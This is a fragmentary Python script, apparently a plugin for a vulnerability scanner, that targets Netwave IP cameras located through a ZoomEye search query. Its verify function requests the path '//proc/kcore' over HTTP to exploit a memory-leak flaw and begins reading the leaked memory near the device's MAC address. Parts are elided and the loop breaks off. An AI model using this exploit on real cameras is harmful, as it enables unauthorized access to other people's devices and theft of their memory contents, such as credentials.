...
config = {
    "author": "writer",
    "device_type": "Netwave",
    "zoomeye_query": "app:Netwave IP camera http config"
}
...
def test(dev):
    ...
    try:
        ...
        dev["mac"] = mac_pattern.search(resp.text).group()
        logger.warning(u"目标主机的mac地址为: %s " % dev["mac"])
...
def verify(dev):
    ...
    try:
        r = requests.get("http://%s:%s//proc/kcore" % (dev["ip"], dev["port"]), stream=True, timeout=30)
        r.raise_for_status()
    except requests.exceptions.RequestException:
        logger.info(u"设备不存在内存泄露漏洞，检测下一个\n")
        return True
    mac_addr = dev["mac"].encode()
    count = 0
    r = r.iter_lines()
    while True:
        count += 1
